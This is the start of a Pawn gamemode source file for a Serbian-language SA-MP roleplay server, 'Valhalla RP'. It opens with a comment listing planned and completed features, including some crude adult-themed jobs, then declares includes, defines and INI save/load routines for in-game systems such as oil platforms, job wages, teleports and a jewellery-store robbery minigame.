/*
                                -=  INFO  =-


#################################################################################
##              -= YOU MAY NOT REMOVE OR CHANGE THIS NOTICE =-                 ##
## --------------------------------------------------------------------------- ##
##  Filename        Valhalla RP                                                ##
##  Developed by:   V01D                                                       ##
##  Name:           SA-MP RP Project                                           ##
##  Copyright:      V:RPG (c) 2022. All rights reserved.                       ##
##                                                                             ##
#################################################################################

-------------------------------------------------------------

- Nove stvari ? :
            https://samp-mods.com/files/file13960.html
            https://samp-mods-com/files/file825.html
            https://samp--mods-com.translate.goog/files/file2462.html?_x_tr_sl=ru&_x_tr_tl=en&_x_tr_hl=sr
            https://samp--mods-com.translate.goog/files/file2940.html?_x_tr_sl=ru&_x_tr_tl=en&_x_tr_hl=sr
            https://samp--mods-com.translate.goog/files/file3336.html?_x_tr_sl=ru&_x_tr_tl=en&_x_tr_hl=sr
            https://samp--mods-com.translate.goog/files/file4332.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=sr
            https://samp--mods-com.translate.goog/files/file5402.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=sr

-------------------------------------------------------------

Ideje za buducnost :

    - Sistem droge

    - Bounty sistem ( igracu iznad glave stoji bounty, random koji je u orgi )

    -Da se ubaci sistem graffita za m/b. ( Kupiš graffit sprey u GS-u, i na odredjenim lokacijama sprejaš i kao npr ako to GSF uradi, na tom graffitu piše  GSF, i da org koja ima najviše graffita dobije odredjeni novac )

    - Dodati STRIPTIZ Klub, te da se isti moze pljackati, te da od te pljacke se dobije droga i novac.
    - Dodati da se moze kupiti trafika. 
     
    - Zaustavi war od strane lidera
    - Sredi kran
    - UpTime
    - Green light - Red Light

    - Safe zone
    - Sistem droge

    - Misija koja vodi u Lost City kao prevoz tereta nekog ( update )

    - Admin moze da baci poklon na neku lokaciju 

    - Casino
    - Duel sistem ( odabir gun, odabir hp-a, pancira i odabir runda ( 1 - 10 ))

-------------------------------------------------------------

-> Uradjene stvari na modu :
    
    - Kopanje kontenjera
    - Test za policiju ( potreban za ulazak u ORG )
    - Lotto
    - Casino sistem ( Roulette )
    - PUBG liveevent ( sve preko skripte ide )
    - Ubacen voice chat
    - Dinamicne plate ( olaksica skripteru )
    - AutoSalon kada se kupi vozilo ne stvara se na jednom mestu vec na 17 random pozicija kod salona
    - Novi Port sistem ( dinamican )
    - Posao Pilot u Floridi ( novom gradu )
    - Posao Astronaut ( popravka broda u svemirskoj stanici koristeci tipke Y i N )
    - Lista ubistava za admine
    - Disarm i UnDisarm
    - Sistem saveza organizacija
    - Winter Panel ( Kapica, sneg... )
    - Kviz Drzava
    - Robanje Rolex Store-a ( Samo lideri mogu pokrenuti rob, slicno kao Gta V, obijanje rafova i kradja zlata )
    - VIP na isticanje
    - Snesko Belic koji daje nagrade na svakih par sati ( moguce je placanje snesku 200k da baci poklone ranije igracima koji su blizu )
    - Posao elektricar ( Textdraw, kao popravka televizora, skidanje maticne ploce i stavljanje )
    - Nova misija ( ukupno 4 sada )
    - Sistem dinamicnih kurvi koje otkrivaju ilegalne lokacije za odredjenu svotu novca
    - Naftne Platforme ( imovina )
    - Matematicki Kviz
    - Potpuno novi inventory sistem ( kolicina slotova zavisi od skilla stamina )
    - Pljackanje organizacija i sistem slabe tacke 
    - Sistem dinamicnih kontenjera i kopanje istih
    - Prevoznik drveca posao
    - Kosac prebacen na pickup ( vozilo )
    - Dinamican port sistem, novi i bolji
    - Skill na poslove, veca plata sto je skill veci
    - Vracen Platni Racun ( Plata igracima zbog skill-a workaholic )
    - Skill System ( 4 razlicita skilla /skillshelp )
    - Lost City ( novi grad ) ( sluzi za posao prevoznik drveca i naftne platforme za sada )
    - Sredjeni pickupovi za zaposljavanje ( bolje odradjeni kao i poslovi u skripti )
    - HVeh i AVeh ( admin i helper vozila )
    - Rob Banke I mapa ( Sa bekstvom u kanalizaciju iz koje igrac mora da pronadje izlaz )
    - Aktivna Igra ( Klasika )
    - SrecniID ( automatski server izabere random igraca i da random nagradu na svakih 10 min )
    - Kantice goriva ( /kupikanticu i /fillcar )
    - RepairKit ( /kupirepairkit i /popravivozilo )
    - Sistem kazni za admine ( olaksica za admine )
    - Sistem krvarenja ( klasika, postoji sansa da krenete krvariti i gubiti HP )
    - Autopilot ( izracunava najkracu rutu do nekog mesta i automatski vas vozi tamo. Radi sa bilo koje lokacije blizu nekog puta )
    - Uradjen novi grad ( oko 3000 objekata koji ce sluziti za bog zna sta )
    - Napravljene firme za poslove ( dobija se procenat kada igrac zavrsi turu tog posla )
    - Novo ostrvo do kojeg se dolazi brodem ili balonom koji se automatski krece ( ostrvo sluzi kao zona i sluzice za sistem droge novi )
    - Vojnik misija 2 ( u misiju ubaceni bulletCam, sabotaza tornja kao i interpolacije kamere )
    - Posao Porno glummica ( Preko progress bara, ides i pusis kurac glumcu )
    - GunShop sistem ( kupovina oruzija pomocu kretanja kamere i tdova kao u ViceCity )
    - Posao Lovac ( automatsko kretanje zivotinja, kada im pridjes krenu da brze trce ili kada ih upucas )
    - Iskakanje iz helisa sa konopcem za PD
    - Achivement sistem 
    - Banka Sistem u TD-u ( radi izgleda )
    - Posao haker ( sa tdovima, kao hakovanje )
    - AirDrop Sistem ( /airdrop )
    - Stock Market ( trgovina deonica )
    - Case opening ( Uskoro se ubacuje opet )
    - TD za novac ( glupost )
    - Ranjavanje igraca i podizanje ( i medkit sistem )
    - 3 razlicite misije ( svi igraci mogu raditi )
    - Lepse unistavanje vozila ( kada ga igrac pogodi )
    - WorkShop sistem ( radionica za popravljanje vozila )
    - Weapon cycle ( da ostane oruzije na telu )
    - Favella i sistem branja i prerade kokaina ( Objasnjenje na /sistemi )
    - Org Veh na pickup ( lideri mogu da kupuju dodatne kolicine svojih vozila )
    - Bitcoin WorkShop ( takodje prodaja na 2 razlicita nacina, i mogucnost da vam server padne, takodje kupovina masina )
    - Pucanje gume nasumicno ( u zavisnosti od drive skill-a )
    - Kran i dostava materijala 
    - Muzej rob ( capture the flag ) ( pokrece admin )
    - Paket koji nosi u orgu i dobija novac
    - Kombi u hangaru koji dostavi u orgu
    - Policajski radari koji se mogu svuda postaviti 
    - Flash za policajce
    - Moler Posao 
    - Bribe sistem ( nasumicne pozicije za skidanje wanteda za novac )
    - War Sistem
    - Wasted TD
    - Portanje kao u GTA V ( kamera odozgo )
    - Prljavi novac 
    - Kombi koji se stvara ispred PD-a

*/
//==================================[ Include ]=================================

#include <a_samp>

#include <pawnbots>
#include <Pawn.RakNet>

#undef MAX_PLAYERS
#define MAX_PLAYERS                                                          1000

// #include <nex-ac>

// #define FCNPC_DISABLE_VERSION_CHECK

#include <SKY>
#include <weapon-config>

#if defined _ALS_OnPlayerGiveDamage
    #undef OnPlayerGiveDamage
#else
    #define _ALS_OnPlayerGiveDamage
#endif
#define OnPlayerGiveDamage NULL_OnPlayerGiveDamage
#if defined NULL_OnPlayerGiveDamage
    forward NULL_OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid, bodypart);
#endif
#if defined _ALS_OnPlayerTakeDamage
    #undef OnPlayerTakeDamage
#else
    #define _ALS_OnPlayerTakeDamage
#endif
#define OnPlayerTakeDamage NULL_OnPlayerTakeDamage
#if defined NULL_OnPlayerTakeDamage
    forward NULL_OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart);
#endif

#include <a_objects>
#include <streamer>

// #include <modelsizes>
// #define OD_METHOD 0
// #include <optidraw>

#include <sscanf2>
#include <YSI\y_ini>

#define FOREACH_NO_BOTS
#define FOREACH_NO_ACTORS

#include <YSI\y_iterate>
#include <YSI\y_timers>
#include <YSI\y_va>
#include <YSI\y_flooding>
#include <utils>
#include <Pawn.CMD>
#include <newsamp>
#include <progress2>
#include <mapandreas>
#include <mSelection>
#include <eSelection>
#include <dini>
#include <fly>
#include <PawnPlus>
#include <RouteConnector>
#include <mapHighlight>
#include <colandreas>
#include <3DTryg>
#include <EVF>
#include <Hunting>
#include <GH_stamina>
#include <vehiclePositions>
#include <ACAirBreak>

#include <SpeedCheats>
#include <Jetpack>
#include <AirbreakTeleport>
#include <sampvoice>

#include <FCNPC>

#include "Mape.pwn"

#include "FloridaCity.pwn"
#include "Bolivia.pwn"
//#include "noviSneg.pwn"
// #include "snow.pwn"

#pragma unused ReturnUser
//==================================[ Natives ]=================================

native pp_SPD(playerid, dialogid, style, caption[], ConstAmxString: info, button1[], button2[]) = ShowPlayerDialog;
native pp_SCM(playerid, color, ConstAmxString: message) = SendClientMessage;
native STREAMER_TAG_3D_TEXT_LABEL:pp_CreateDynamic3DTextLabel(ConstAmxString:string, color, Float:x, Float:y, Float:z, Float:drawdistance, attachedplayer = INVALID_PLAYER_ID, attachedvehicle = INVALID_VEHICLE_ID, testlos = 0, worldid = -1, interiorid = -1, playerid = -1, Float:streamdistance = STREAMER_3D_TEXT_LABEL_SD, STREAMER_TAG_AREA:areaid = STREAMER_TAG_AREA:-1, priority = 0) = CreateDynamic3DTextLabel;
native pp_strcat(dest[], ConstAmxString: source, maxlength=sizeof dest) = strcat;
//==================================[ Igraci ]==================================

#undef MAX_ACTORS
#define MAX_ACTORS 															 10

#undef MAX_VEHICLES
#define MAX_VEHICLES                                                        2000

new Iterator:serverVehicles<MAX_VEHICLES>;

#define MAX_POKUSAJ_LOGINA                                                     3
#define I_FILE                                  			  "Korisnici/%s.ini"
#define FILE_BAN                                			   "Banovani/%s.ini"
#define A_FILE                                  			  	 "Admini/%s.ini"
#define LOZINKA_STRING 														  50

#define OBICAN_ZATVOR 1
#define ALKATRAZ 2

#define SCMTA       SendClientMessageToAll  

#define PovecajPVarInt(%0,%1,%2)     SetPVarInt(%0, %1, GetPVarInt(%0, %1) + %2)
#define ClearChat(%0,%1)  for( new n=0; n<%1; n++) SendClientMessage(%0, -1, " ")

#define HOLDING(%0) 							((newkeys & (%0)) == (%0))
#if !defined PRESSED
	#define PRESSED(%0) 						(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#endif

#define RELEASED(%0) \
	(((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))

//native IsValidVehicle( vehicleid );

new onlinepl, postojecirekord;

new OnlineIgraca;

#define gettimeEx(%0,%1,%2) gettime(%0,%1,%2); %0 -= 1

///////////////////////////////////////////////////////////

new SV_LSTREAM:lstream[MAX_PLAYERS] = { SV_NULL, ... };

public SV_VOID:OnPlayerActivationKeyPress(SV_UINT:playerid, SV_UINT:keyid) 
{
    if (keyid == 0x58 && lstream[playerid]) SvAttachSpeakerToStream(lstream[playerid], playerid);
}

public SV_VOID:OnPlayerActivationKeyRelease(SV_UINT:playerid, SV_UINT:keyid)
{
    if (keyid == 0x58 && lstream[playerid]) SvDetachSpeakerFromStream(lstream[playerid], playerid);
}

///////////////////////////////////////////////////////////

#define RadionicaBuyPrice           3000000
#define ORG_PICKUP_PRICE            60000
#define BTCWORKSHOP_PRICE           4000000
#define NAFTNAPLATFORMA_PRICE       20000000
#define NAFTNAPLATFORMA_DOBITAK     40000

#define Firma_MarketCena            1000000
#define Firma_MarketLevel           10

#define Firma_BurgCena              500000
#define Firma_BurgLevel             5

#define Firma_CluckingCena          500000
#define Firma_CluckingLevel         5

#define Firma_BincoCena             650000
#define Firma_BincoLevel            6

#define Firma_BarCena               300000
#define Firma_BarLevel              8

#define Firma_MRestoranCena         600000
#define Firma_MRestoranLevel        5

#define Firma_VRestoranCena         800000
#define Firma_VRestoranLevel        8

#define Firma_GunShopCena           1500000
#define Firma_GunShopLevel          12

#define ZlataraRobTime              30
#define BankaRobTime                30
#define BankaHackTime               30
#define HouseRobTime                30
#define RobTrafikeTime              30
#define RobMarketTime               30
#define robOrgeTime                 30

#define ZlataraRobPrice             170000
#define BankaRobPrice               170000
#define FavellaPrice                200000
#define MuzejPrice                  150000
#define BankaHackPrice              20000
#define RobHousePrice               10000
#define RobTrafikePrice             7000
#define RobMarketPrice              10000
#define MafijaPaketPrice            50000
#define RolexRobPrice               60 //grama zlata po rafu ( oko 170k ukupno kada proda )
#define robOrgePrice                150000

///////////////////////////////////////////////////////////

#define TDSFP TextDrawShowForPlayer

#define col_job                           "{36AB00}"
#define col_white                         "{FFFFFF}"
//#define col_crvena                        "{FF0000}"
#define col_crvena                        "{C7C7C7}"
#define col_green 						  "{33AA33}"
#define col_red                           "{FF0000}"

#define SRVBOJA1SCM                       "{B2A8C7}"

//====================================[ TRAIN IDE GAS ] by V01D

new TrainDriverVehicle = INVALID_VEHICLE_ID;
new TrainDriverNPC = INVALID_PLAYER_ID;
new TrainDriverPlaybackCycle = 0;

new trainTimer = 0;
new bool:trainActive = false;
new bool:trainArrived = false;
new trainVrednost = 1;

new trainObjects[6];
new bool:activeTrainBox[6];
new Text3D:trainBoxLabel[6];

new bool:trainTDActive = false;
new Text:VozStizeTD[5];

new bool:nosiTrainBox[MAX_PLAYERS];

new Float:trainBoxPos[6][3] = {

    {2827.504638, -103.871879, 34.734733},
    {2827.568359, -97.578239, 34.734733},
    {2827.412841, -92.878654, 34.634727},
    {2827.849609, -86.580757, 34.544754},
    {2827.439208, -80.828437, 34.354751},
    {2827.680908, -75.083412, 34.154777}
};

#define TRAIN_TIMER             20 //ovo je u sekundama radi testa

///////////////////////////////////////

new skoroZauzimao[MAX_PLAYERS];

///////////////////////////////////// PUBG LiveEvent

new bool:PubgPokrenut;
new PubgZonaCount;
new PubgZona;
new bool:PubgPocelo;

new bool:PubgIgra[MAX_PLAYERS];
new PubgIgraci;
new bool:PubgSkace[MAX_PLAYERS];

new PubgAvionObjekat;
new cameraObj;

new pubgStartCount;

#define PubgGreska(%0,%1) \
    va_SendClientMessage(%0, 0xFD3333FF, "[PUBG GRESKA] {FFFFFF}"%1)

#define PubgMessage(%0,%1) \
    va_SendClientMessage(%0, 0xFD3333FF, "[PUBG INFO] {FFFFFF}"%1)

#define PubgMessageAll(%0) \
    va_SendClientMessageToAll(0xFD3333FF, "[PUBG INFO] {FFFFFF}"%0)


#define MAX_PUBGWEAPONS             100
new pubgPickup[MAX_PUBGWEAPONS];

#define PubgVirtualWorld            80
#define PubgNagrada                 15000

//////////////////////////////// Roulette System by V01D

new RouletteUlog[MAX_PLAYERS];
new RouletteOdabir[MAX_PLAYERS];
new bool:RouletteIgra[MAX_PLAYERS];
new vrteoSkoro[MAX_PLAYERS];

new PlayerText:RouletteTD[MAX_PLAYERS][100];

////////////////////////////////

new TacnihOdgovoraPD[MAX_PLAYERS];

new oglasTimer[MAX_PLAYERS];

////////////////////////////////

new Float:RandomAutoSalon[17][4] = {

    { 939.7753,-1668.9985,13.2740,179.4836 }, // Salon1
    { 934.9956,-1668.9543,13.2752,181.0875 }, // Salon2
    { 929.8107,-1669.1183,13.2757,178.5381 }, // Salon3
    { 949.8428,-1668.7964,13.2842,182.2184 }, // Salon4
    { 955.2581,-1669.0366,13.2845,178.9878 }, // Salon5
    { 960.0746,-1668.5499,13.2843,181.4360 }, // Salon6
    { 964.9562,-1668.8794,13.2846,180.4109 }, // Salon7
    { 970.1970,-1668.4067,13.2837,179.9111 }, // Salon8
    { 969.8290,-1691.2596,13.3156,178.9312 }, // Salon9
    { 964.9802,-1692.2915,13.3147,357.3284 }, // Salon10
    { 959.5449,-1690.7855,13.3143,356.9212 }, // Salon11
    { 954.5377,-1691.8683,13.3155,359.9828 }, // Salon12
    { 949.8738,-1692.3131,13.3140,0.8597 }, // Salon13
    { 944.4108,-1690.8757,13.2950,359.6540 }, // Salon14
    { 939.7259,-1691.3750,13.2949,358.6299 }, // Salon15
    { 935.1203,-1691.6671,13.2954,357.1374 }, // Salon16
    { 929.7144,-1690.9125,13.2956,0.7611 } // Salon17
};

////////////////////////////////

new ProveraIgraca[MAX_PLAYERS];
new ProveraRanac[MAX_PLAYERS];

////////////////////////////////

new robaOrganizaciju[MAX_PLAYERS];
new robaOrganizacijuTime[MAX_PLAYERS];
new bool:prekinuoOrgRob[MAX_PLAYERS];

/////////////////////////////////

#define V_FILE                                                   "Vozila/%i.ini"
#define MAX_CARS                                                            2000

#define PRIVATNO_VOZILO                                                        1
#define SPAWN_VOZILO                                                           2

//////////////////////////////// Inventory System
#define inventoryPizzaID                    (101)
#define inventorySokID                      (102)
#define inventoryPivoID                     (103)
#define inventoryHamburgerID                (104)
#define inventoryPiletinaID                 (105)

new inventorySlot[MAX_PLAYERS];

/////////////////////////////////

new bool:kopaKontenjer[MAX_PLAYERS];
new kopaKontenjerTimer[MAX_PLAYERS];

/////////////////////////////////

new bool:imaSrafciger[MAX_PLAYERS];

////////////////////////////////

new bool:matematikaAktivan;
new matematikaRezultat;

new aktiviranSnesko;

//////////////////////////////////////// NAFTNE PLATFORME
#define PLATFORMA_FILE   "NaftnePlatforme/%d.ini"
#define MAX_PLATFORMI 5000

#define PLATFORMACOLOR              "{7E67BA}"

enum Platforme
{
    pVlasnik[MAX_PLAYER_NAME],
    pNovac,
    Float:pUlazX,
    Float:pUlazY,
    Float:pUlazZ
};
new NaftaInfo[MAX_PLATFORMI][Platforme];
new NaftaPickup[sizeof(NaftaInfo)];
new Text3D:NaftaLabel[sizeof(NaftaInfo)];

forward UcitajNaftnuPlatformu(id, name[], value[]);
public UcitajNaftnuPlatformu(id, name[], value[])
{
    INI_String("Vlasnik", NaftaInfo[id][pVlasnik], 45);
    INI_Int("Novac", NaftaInfo[id][pNovac]);
    INI_Float("UlazX", NaftaInfo[id][pUlazX]);
    INI_Float("UlazY", NaftaInfo[id][pUlazY]);
    INI_Float("UlazZ", NaftaInfo[id][pUlazZ]);
    return 1;
}

SacuvajNaftnuPlatformu(id)
{
    new fFile[128];
    format(fFile, 128, PLATFORMA_FILE, id);
    new INI:File = INI_Open(fFile);
    
    INI_WriteString(File, "Vlasnik", NaftaInfo[id][pVlasnik]);
    INI_WriteInt(File, "Novac", NaftaInfo[id][pNovac]);
    INI_WriteFloat(File, "UlazX", NaftaInfo[id][pUlazX]);
    INI_WriteFloat(File, "UlazY", NaftaInfo[id][pUlazY]);
    INI_WriteFloat(File, "UlazZ", NaftaInfo[id][pUlazZ]);

    INI_Close(File);
    return 1;
}

NaftaLabelUpdate(id)
{
    DestroyDynamic3DTextLabel(NaftaLabel[id]);
    DestroyDynamicPickup(NaftaPickup[id]);
    new fFile[80], string[220];
    format(fFile, 80, PLATFORMA_FILE, id);

    if(strcmp( NaftaInfo[id][pVlasnik], "Niko", true )) {

        format(string, 220, ""PLATFORMACOLOR"[ Naftna Platforma ]\nVlasnik : "col_white"%s\n"PLATFORMACOLOR"ID: "col_white"%d\n"PLATFORMACOLOR"Koristi : "col_white"/platforma", NaftaInfo[id][pVlasnik], id);
        NaftaLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
        NaftaPickup[id] = CreateDynamicPickup(1252, 1, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);


    }
    else if(!strcmp( NaftaInfo[id][pVlasnik], "Niko", true )) {

        format(string, 220, ""PLATFORMACOLOR"[ Naftna Platforma ]\nVlasnik : "col_white"NIKO\n"PLATFORMACOLOR"ID: "col_white"%d\n"PLATFORMACOLOR"Cena: "col_white"%d$\n"PLATFORMACOLOR"Da kupis naftnu platformu koristi /kupiplatformu", id, NAFTNAPLATFORMA_PRICE);
        NaftaLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
        NaftaPickup[id] = CreateDynamicPickup(18631, 1, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);
    }
}

////////////////////////////////////////
//Prostitutke

#define SlutsFile   "Kurve/Kurva_%d.ini"

#define MAX_SLUTS 100

enum Slutss
{
    Float:slutPosX,
    Float:slutPosY,
    Float:slutPosZ
};

new slutInfo[MAX_SLUTS][Slutss];
new Text3D:slutLabel[sizeof(slutInfo)];
new slutActor[sizeof(slutInfo)];
new slutMapIcon[sizeof(slutInfo)];
new slutRadi[sizeof(slutInfo)];

forward LoadSluts(slutID, name[], value[]);
public LoadSluts(slutID, name[], value[])
{
    INI_Float("X", slutInfo[slutID][slutPosX]);
    INI_Float("Y", slutInfo[slutID][slutPosY]);
    INI_Float("Z", slutInfo[slutID][slutPosZ]);
    return 1;
}

SaveSluts(slutID)
{
    new fFile[128];
    format(fFile, 128, SlutsFile, slutID);
    new INI:File = INI_Open(fFile);

    INI_WriteFloat(File, "X", slutInfo[slutID][slutPosX]);
    INI_WriteFloat(File, "Y", slutInfo[slutID][slutPosY]);
    INI_WriteFloat(File, "Z", slutInfo[slutID][slutPosZ]);
    INI_Close(File);
    return 1;
}

getNearestSlut(playerid) {
    for(new i = 1; i < MAX_SLUTS; i++) {

        if(IsPlayerInRangeOfPoint(playerid, 3.0, slutInfo[i][slutPosX], slutInfo[i][slutPosY], slutInfo[i][slutPosZ])) return i;
    }
    return -1;
}

stock getNextSlutID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), SlutsFile, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
    return ( id );
}

////////////////////////////////////////

new posaoPlate[MAX_PLAYERS];

enum plateEnum {
    
    PLATA_MOLER,
    PLATA_RUDAR,
    PLATA_VOJNIK,
    PLATA_SABOTAZER,
    PLATA_DELIVERY_LEGAL,
    PLATA_DELIVERY_ILEGAL,
    PLATA_HAKER,
    PLATA_KOSAC,
    PLATA_LOVAC,
    PLATA_PORNO,
    PLATA_ASTRONAUT,
    PLATA_DRVA,
    PLATA_PILOT,
    PLATA_DILER,
    PLATA_ELEKTRIK
}
new PlataPosla[plateEnum];

forward LoadServerPlate( name[ ], value[ ] );
public LoadServerPlate( name[ ], value[ ] ) {

    INI_Int( "PlataMoler", PlataPosla[PLATA_MOLER]);
    INI_Int( "PlataRudar", PlataPosla[PLATA_RUDAR]);
    INI_Int( "PlataVojnik", PlataPosla[PLATA_VOJNIK]);
    INI_Int( "PlataSabotazer", PlataPosla[PLATA_SABOTAZER]);
    INI_Int( "PlataDeliveryLeg", PlataPosla[PLATA_DELIVERY_LEGAL]);
    INI_Int( "PlataDeliveryIleg", PlataPosla[PLATA_DELIVERY_ILEGAL]);
    INI_Int( "PlataHaker", PlataPosla[PLATA_HAKER]);
    INI_Int( "PlataKosac", PlataPosla[PLATA_KOSAC]);
    INI_Int( "PlataLovac", PlataPosla[PLATA_LOVAC]);
    INI_Int( "PlataPorno", PlataPosla[PLATA_PORNO]);
    INI_Int( "PlataAstronaut", PlataPosla[PLATA_ASTRONAUT]);
    INI_Int( "PlataDrva", PlataPosla[PLATA_DRVA]);
    INI_Int( "PlataPilot", PlataPosla[PLATA_PILOT]);
    INI_Int( "PlataDiler", PlataPosla[PLATA_DILER]);
    INI_Int( "PlataElektricar", PlataPosla[PLATA_ELEKTRIK]);
    
    return 1;
}

SacuvajPlate() {

    new INI:File = INI_Open( "Ostalo/plateServera.ini" );
    INI_SetTag( File, "PlatePoslova" );
    
    INI_WriteInt(File, "PlataMoler", PlataPosla[PLATA_MOLER]);
    INI_WriteInt(File, "PlataRudar", PlataPosla[PLATA_RUDAR]);
    INI_WriteInt(File, "PlataVojnik", PlataPosla[PLATA_VOJNIK]);
    INI_WriteInt(File, "PlataSabotazer", PlataPosla[PLATA_SABOTAZER]);
    INI_WriteInt(File, "PlataDeliveryLeg", PlataPosla[PLATA_DELIVERY_LEGAL]);
    INI_WriteInt(File, "PlataDeliveryIleg", PlataPosla[PLATA_DELIVERY_ILEGAL]);
    INI_WriteInt(File, "PlataHaker", PlataPosla[PLATA_HAKER]);
    INI_WriteInt(File, "PlataKosac", PlataPosla[PLATA_KOSAC]);
    INI_WriteInt(File, "PlataLovac", PlataPosla[PLATA_LOVAC]);
    INI_WriteInt(File, "PlataPorno", PlataPosla[PLATA_PORNO]);
    INI_WriteInt(File, "PlataAstronaut", PlataPosla[PLATA_ASTRONAUT]);
    INI_WriteInt(File, "PlataDrva", PlataPosla[PLATA_DRVA]);
    INI_WriteInt(File, "PlataPilot", PlataPosla[PLATA_PILOT]);
    INI_WriteInt(File, "PlataDiler", PlataPosla[PLATA_DILER]);
    INI_WriteInt(File, "PlataElektricar", PlataPosla[PLATA_ELEKTRIK]);

    INI_Close( File );
    return true;
}

////////////////////////////////////////

new poslaoTP[MAX_PLAYERS];

////////////////////////////////////////

new paparazoTarget[20];
new paparazoMeta[MAX_PLAYERS];
new bool:radiPaparazo[MAX_PLAYERS];

new Timer:paparazoTimer;

////////////////////////////////////////

new drunkTime[MAX_PLAYERS];

////////////////////////////////////////

new radiElektricar[MAX_PLAYERS];
new elektricarVozilo[MAX_PLAYERS];
new PlayerText:ElektricarTD[MAX_PLAYERS][7];

////////////////////////////////////////

new Indicators_xqz[MAX_VEHICLES][6];

////////////////////////////////////////

new bool:RolexUToku;
new bool:RolexBioSkoro;
new RolexPickup[14];
new Text3D:RolexLabel[14];
new rolexRobaOrg;
new RolexCuvar;
new bool:robaRafRolex[MAX_PLAYERS];
new opljackaniRafovi;

new Float:RolexPickupPos[14][3] =
{
    {1806.2440,-1248.5265,13.6751 },
    {1804.5236,-1248.5293,13.6731 },
    {1799.4949,-1245.9257,13.6731 },
    {1794.1482,-1248.5364,13.6731 },
    {1792.3008,-1248.5358,13.6721 },
    {1794.4481,-1243.3821,13.6499 },
    {1794.4426,-1241.8500,13.6499 },
    {1799.2535,-1242.5785,13.6731 },
    {1804.1101,-1243.4850,13.6499 },
    {1804.1741,-1241.7222,13.6499 },
    {1804.1353,-1235.2401,13.6764 },
    {1802.2434,-1235.2350,13.6764 },
    {1796.2637,-1235.2352,13.6764 },
    {1794.4772,-1235.2382,13.6764 }
};


///////////////////////////////////////

enum gradoviData {

    gradoviGrad[35],
    gradoviRez[35]
};

new gradoviKviz[15][gradoviData] = {

    {"Grcka", "Atina"},
    {"Nemacka", "Berlin"},
    {"Austrija", "Bec"},
    {"SAD", "Washington"},
    {"Hrvatska", "Zagreb"},
    {"Srbija", "Beograd"},
    {"BiH", "Sarajevo"},
    {"Ukrajina", "Kijev"},
    {"Urugvaj", "Montevideo"},
    {"Rusija", "Moskva"},
    {"Kina", "Peking"},
    {"Italija", "Rim"},
    {"Portugalija", "Lisabon"},
    {"Spanija", "Madrid"},
    {"Slovenija", "Ljubljana"}
};

new bool:aktivanKviz;
new kvizResenje;

////////////////////////////////////// Winter Edition

// new nosiKapicu[MAX_PLAYERS];

// #define MAX_SNOW_OBJECTS    6
// #define UPDATE_INTERVAL     750
// #define SNOW_RADIUS         2

// new bool:snowOn[MAX_PLAYERS],
//         snowObject[MAX_PLAYERS][MAX_SNOW_OBJECTS],
//         updateTimer[MAX_PLAYERS];

//////////////////////////////////////

new radiPilot[MAX_PLAYERS];
new pilotVozilo[MAX_PLAYERS];

////////////////////////////////////////

new deathCount;
new killerList[512];
new victimList[512];
new Text:tdDeathList[3];
new bool:gDeathList[MAX_PLAYERS];

////////////////////////////////////////

new prevoziDrva[MAX_PLAYERS];
new posaoDrvaVozilo[MAX_PLAYERS];
// new posaoDrvaObjekat[MAX_PLAYERS];

////////////////////////////////////////

new odabranaPortVrsta[MAX_PLAYERS];
new bool:portSeIgrac[MAX_PLAYERS];

#define PORTING_FILE         "Portovi/Port_%d.ini"

#define MAX_PORTING 150

enum adminPortovi {

    portIme[64],
    Float:portPos[3],
    portVrsta
}

new portInfo[MAX_PORTING][adminPortovi];

forward UcitajPortove(portID, name[], value[]);
public UcitajPortove(portID, name[], value[])
{
    INI_String("portIme", portInfo[portID][portIme], 64);
    INI_Float("portPosX", portInfo[portID][portPos][0]);
    INI_Float("portPosY", portInfo[portID][portPos][1]);
    INI_Float("portPosZ", portInfo[portID][portPos][2]);
    INI_Int("portVrsta", portInfo[portID][portVrsta]);
    return 1;
}

SacuvajPort(portID)
{
    new fFile[128];
    format(fFile, 128, PORTING_FILE, portID);
    new INI:File = INI_Open(fFile);

    INI_WriteString(File, "portIme", portInfo[portID][portIme]);
    INI_WriteFloat(File, "portPosX", portInfo[portID][portPos][0]);
    INI_WriteFloat(File, "portPosY", portInfo[portID][portPos][1]);
    INI_WriteFloat(File, "portPosZ", portInfo[portID][portPos][2]);
    INI_WriteInt(File, "portVrsta", portInfo[portID][portVrsta]);

    INI_Close(File);
    return 1;
}

stock SledeciIDPort(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), PORTING_FILE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
    return ( id );
}

GetNearestPort( playerid ) {
    for( new b = 0; b < sizeof(portInfo); b++) {
        if( IsPlayerInRangeOfPoint( playerid, 3.0, portInfo[b][portPos][0], portInfo[b][portPos][1], portInfo[b][portPos][2] ) ) return b; }
    return -1;
}

////////////////////////////////////////

new bool:radiAstronaut[MAX_PLAYERS];
new astronautCP[MAX_PLAYERS];

new PlayerText:astronautPopravkaTD[MAX_PLAYERS][3];
new bool:astronautTDShowed[MAX_PLAYERS];
